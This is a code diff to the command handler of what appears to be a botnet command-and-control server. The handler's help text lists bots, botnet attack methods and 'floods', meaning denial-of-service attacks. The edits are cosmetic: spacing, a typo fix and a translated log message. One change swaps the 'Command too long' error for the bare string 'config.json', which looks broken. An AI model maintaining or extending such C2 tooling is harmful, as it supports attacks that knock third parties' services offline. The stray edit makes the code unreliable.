@@ -18,7 +18,7 @@ class CommandHandler:
         blue = Fore.LIGHTBLUE_EX
         
         if len(data) > self.server.max_data_len:
-            self.server.send(client, f'{red}Command too long\n')
+            self.server.send(client, f'config.json')
             return True
         
         args = data.split(' ')
@@ -63,13 +63,13 @@ class CommandHandler:
     
     def _handle_help(self, client, gray, white):
         self.server.send(client, colorize_text_gradient('Commands:           Description:'))
-        self.server.send(client, f'{white}HELP{gray}                Shows list of commands')
-        self.server.send(client, f'{white}BOTNET{gray}              Shows list of botnet attack methods')
-        self.server.send(client, f'{white}BOTS{gray}                Shows all conected bots')
-        self.server.send(client, f'{white}STOP{gray}                Stop all your floods in progress')
-        self.server.send(client, f'{white}CLEAR{gray}               Clears the screen')
-        self.server.send(client, f'{white}OWNER{gray}               Shows owner information')
-        self.server.send(client, f'{white}LOGOUT{gray}              Disconnects from C&C server\n')
+        self.server.send(client, f'{white}HELP{gray} Shows list of commands')
+        self.server.send(client, f'{white}BOTNET{gray} Shows list of botnet attack methods')
+        self.server.send(client, f'{white}BOTS{gray} Shows all connected bots')
+        self.server.send(client, f'{white}STOP{gray} Stop all your floods in progress')
+        self.server.send(client, f'{white}CLEAR{gray} Clears the screen')
+        self.server.send(client, f'{white}OWNER{gray} Shows owner information')
+        self.server.send(client, f'{white}LOGOUT{gray} Disconnects from C&C server\n')
     
     def _handle_botnet(self, client, username, white, yellow, red):
         botnetMethods = botnetMethodsName('ALL')
@@ -98,7 +98,7 @@ class CommandHandler:
         if self.server.attack_manager.stop(username):
             self.server.broadcast('STOP', username)
             self.server.send(client, f'\n{gray}> {white}Your flooding has been successfully stopped.\n')
-            logging.info(f"Ataque de {sanitize_log(username)} parado manualmente")
+            logging.info(f"{sanitize_log(username)} attack stopped manually")
         else:
             self.server.send(client, f'\n{gray}> {white}You have no floods in progress.\n')
     
